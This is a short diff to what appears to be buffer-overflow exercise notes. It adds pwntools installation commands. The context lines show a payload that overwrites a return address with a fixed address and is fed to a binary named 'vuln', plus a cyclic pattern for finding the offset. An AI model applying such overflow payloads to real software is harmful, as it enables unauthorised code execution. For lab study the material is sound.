@@ -31,7 +31,11 @@ python3 -c "print('A'*64 + 'BBBB' + '\xe2\x91\x04\x08')" > input.txt
 ./vuln < input.txt
 
 
-
+Last things last:
+$ apt-get update
+$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
+$ python3 -m pip install --upgrade pip
+$ python3 -m pip install --upgrade pwntools
 
 python3 -c "from pwn import *; print(cyclic(100))" > input.txt
 ./vuln < input.txt
